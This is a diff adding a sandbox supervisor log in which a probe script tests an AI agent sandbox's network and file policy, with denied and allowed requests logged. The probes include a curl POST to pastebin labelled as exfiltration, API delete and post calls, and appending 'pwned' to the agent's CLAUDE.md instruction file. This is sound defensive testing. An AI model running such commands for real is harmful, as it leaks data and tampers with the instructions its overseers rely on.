@@ -1,0 +1,35 @@
+[1791351810.839] [sandbox] [WARN ] [openshell_supervisor] Could not open /var/log for log rotation; using stderr-only logging
+[1791351810.839] [sandbox] [INFO ] [openshell_supervisor] Starting sandbox supervision command=["sh", "-c", "set +e\necho \"== identity: $(id -un) uid=$(id -u) kernel=$(uname -r)\"\necho \"== claude: $(claude --version 2>&1)\"\nt(){ printf '%-48s ' \"$1\"; shift; out=$(\"$@\" 2>&1); echo \"rc=$? $(echo \"$out\" | tr '\\n' ' ' | cut -c1-110)\"; }\nt \"GET  graph.instagram.com (read ok)\"   curl -sS -o /dev/null -w '%{http_code}' https://graph.instagram.com/v24.0/me\nt \"POST graph.instagram.com/media\"       curl -sS -o /dev/null -w '%{http_code}' -X POST https://graph.instagram.com/v24.0/123/media\nt \"DELETE graph.facebook.com\"            curl -sS -o /dev/null -w '%{http_code}' -X DELETE https://graph.facebook.com/v21.0/17952\nt \"POST pastebin.com (exfil)\"            curl -sS -o /dev/null -w '%{http_code}' -X POST https://pastebin.com/api/api_post.php\nt \"GET culture.seoul.go.kr via curl\"     curl -sS -o /dev/null -w '%{http_code}' https://culture.seoul.go.kr/\nt \"GET apis.data.go.kr via curl\"         curl -sS -o /dev/null -w '%{http_code}' https://apis.data.go.kr/\nt \"write /sandbox/agent/CLAUDE.md\"       sh -c 'echo pwned >> /sandbox/agent/CLAUDE.md'\nt \"write /sandbox/out/ok.txt\"            sh -c 'echo ok > /sandbox/out/ok.txt && cat /sandbox/out/ok.txt'\nt \"read /etc/hostname\"                   cat /etc/hostname; echo HOME=$HOME"]
+[1791351817.375] [sandbox] [INFO ] [openshell_supervisor] Fetching sandbox policy via gRPC endpoint=https://127.0.0.1:17670 sandbox=wok-probe2 sandbox_id=37b9e050-5463-4231-9df9-bfd58d003cae
+[1791351817.388] [sandbox] [INFO ] [openshell_supervisor_network::opa] Configured OPA runtime binary identity mode require_binary_identity=true source=proto
+[1791351817.388] [sandbox] [OCSF ] [ocsf] CONFIG:CONFIGURED [INFO] OPA runtime binary identity mode configured [source:proto require_binary_identity:true] [source:proto]
+[1791351817.397] [sandbox] [INFO ] [openshell_supervisor] Isolation boundary attached backend=openshell-sandbox
+[1791351817.398] [sandbox] [INFO ] [openshell_supervisor] Isolation boundary enforcement confirmed backend=openshell-sandbox
+[1791351817.402] [sandbox] [OCSF ] [ocsf] CONFIG:ENABLED [INFO] TLS termination enabled: ephemeral CA generated
+[1791351817.403] [sandbox] [OCSF ] [ocsf] CONFIG:READY [INFO] Policy DNS connected to isolation boundary
+[1791351817.403] [sandbox] [OCSF ] [ocsf] NET:LISTEN [INFO] 127.0.0.1:3128
+[1791351817.445] [sandbox] [INFO ] [openshell_supervisor] Isolation boundary agent started backend=openshell-sandbox
+[1791351817.447] [sandbox] [OCSF ] [ocsf] SSH:LISTEN [INFO]
+[1791351817.452] [sandbox] [OCSF ] [ocsf] CONFIG:LOADED [INFO] Acknowledged initial policy revision as loaded [version:1] [hash:3ede46754052a10e7b98ca95553d5fd219e27756709d39bc246a8b77ae6e6138]
+[1791351817.456] [sandbox] [OCSF ] [ocsf] NET:OPEN [INFO] 127.0.0.1:17670
+[1791351817.456] [sandbox] [INFO ] [openshell_supervisor] Control-mode access plane started backend=openshell-sandbox
+[1791351817.505] [sandbox] [OCSF ] [ocsf] EVENT [INFO] ssh relay open (channel_id=b4730993-3ae2-4246-bac1-9ddb43418f5e, target=unix:/tmp/os-1000-7e8f7a243553c00e6bcda2e2212d796f/37b9e050-5463-4231-9df9-bfd58d003cae/ssh.sock)
+[1791351817.505] [sandbox] [OCSF ] [ocsf] SSH:OPEN [INFO] ALLOWED
+[1791351817.637] [sandbox] [OCSF ] [ocsf] CONFIG:PUBLISHED [INFO] Policy DNS mapped graph.instagram.com resolved=57.144.200.192 synthetic=198.18.0.2 ports=443 mapping_id=22553fd8-18cc-405a-9ae0-163f4b13a3d2
+[1791351817.650] [sandbox] [OCSF ] [ocsf] NET:OPEN [INFO] ALLOWED /usr/bin/curl(0) -> graph.instagram.com:443 [policy:instagram_guard engine:opa]
+[1791351817.688] [sandbox] [OCSF ] [ocsf] HTTP:GET [INFO] ALLOWED GET http://graph.instagram.com:443/v24.0/me [policy:instagram_guard engine:l7]
+[1791351817.729] [sandbox] [OCSF ] [ocsf] CONFIG:PUBLISHED [INFO] Policy DNS mapped graph.instagram.com resolved=57.144.200.192 synthetic=198.18.0.2 ports=443 mapping_id=fafc6633-daae-4c82-a26e-5cd88c33b5a6
+[1791351817.739] [sandbox] [OCSF ] [ocsf] NET:OPEN [INFO] ALLOWED /usr/bin/curl(0) -> graph.instagram.com:443 [policy:instagram_guard engine:opa]
+[1791351817.757] [sandbox] [OCSF ] [ocsf] HTTP:POST [MED] DENIED POST http://graph.instagram.com:443/v24.0/123/media [policy:instagram_guard engine:l7] [reason:L7_REQUEST deny POST graph.instagram.com:443/v24.0/123/media reason=POST /v24.0/123/media not permitted by policy]
+[1791351817.774] [sandbox] [OCSF ] [ocsf] CONFIG:PUBLISHED [INFO] Policy DNS mapped graph.facebook.com resolved=57.144.200.141 synthetic=198.18.0.3 ports=443 mapping_id=6b521b23-0c93-4f7a-8012-e5ad64cb2812
+[1791351817.784] [sandbox] [OCSF ] [ocsf] NET:OPEN [INFO] ALLOWED /usr/bin/curl(0) -> graph.facebook.com:443 [policy:instagram_guard engine:opa]
+[1791351817.812] [sandbox] [OCSF ] [ocsf] HTTP:DELETE [MED] DENIED DELETE http://graph.facebook.com:443/v21.0/17952 [policy:instagram_guard engine:l7] [reason:L7_REQUEST deny DELETE graph.facebook.com:443/v21.0/17952 reason=DELETE /v21.0/17952 not permitted by policy]
+[1791351817.823] [sandbox] [OCSF ] [ocsf] NET:REFUSE [MED] DENIED pastebin.com [reason:policy_dns_ineligible]
+[1791351817.823] [sandbox] [OCSF ] [ocsf] CONFIG:OBSERVATION [INFO] Policy DNS staged unapproved name pastebin.com synthetic=198.18.0.4 for TCP policy review
+[1791351817.825] [sandbox] [WARN ] [openshell_supervisor_network::proxy] Denied staged transparent connection destination=198.18.0.4:443 reason=endpoint pastebin.com:443 is not allowed by any policy
+[1791351817.825] [sandbox] [OCSF ] [ocsf] NET:OPEN [MED] DENIED /usr/bin/curl(0) -> pastebin.com:443 [reason:transparent_tcp_policy_denied]
+[1791351818.030] [sandbox] [OCSF ] [ocsf] CONFIG:PUBLISHED [INFO] Policy DNS mapped culture.seoul.go.kr resolved=115.84.164.197 synthetic=198.18.0.5 ports=443 mapping_id=441ea293-2f60-4378-950f-11a672d69d96
+[1791351818.032] [sandbox] [WARN ] [openshell_supervisor_network::proxy] Denied staged transparent connection destination=198.18.0.5:443 reason=binary '/usr/bin/curl' not allowed in policy 'event_pages' (ancestors: [/usr/bin/dash], cmdline: [/dev/null]). SYMLINK HINT: the binary path is the kernel-resolved target from /proc/<pid>/exe, not the symlink. If your policy specifies a symlink (e.g., /usr/bin/python3) but the actual binary is /usr/bin/python3.11, either: (1) use the canonical path in your policy (run 'readlink -f /usr/bin/python3' inside the sandbox), or (2) ensure symlink resolution is working (check sandbox logs for 'Cannot access container filesystem')
+[1791351818.032] [sandbox] [OCSF ] [ocsf] NET:OPEN [MED] DENIED /usr/bin/curl(0) -> culture.seoul.go.kr:443 [reason:transparent_tcp_policy_denied]
+[1791351818.042] [sandbox] [OCSF ] [ocsf] CONFIG:PUBLISHED [INFO] Policy DNS mapped apis.data.go.kr resolved=27.101.236.63 synthetic=198.18.0.6 ports=443 mapping_id=b4e15f96-ece2-4f5b-899f-ed175afb056e
+[1791351818.257] [sandbox] [OCSF ] [ocsf] NET:OPEN [INFO] ALLOWED /usr/bin/curl(0) -> apis.data.go.kr:443 [policy:public_data engine:opa]
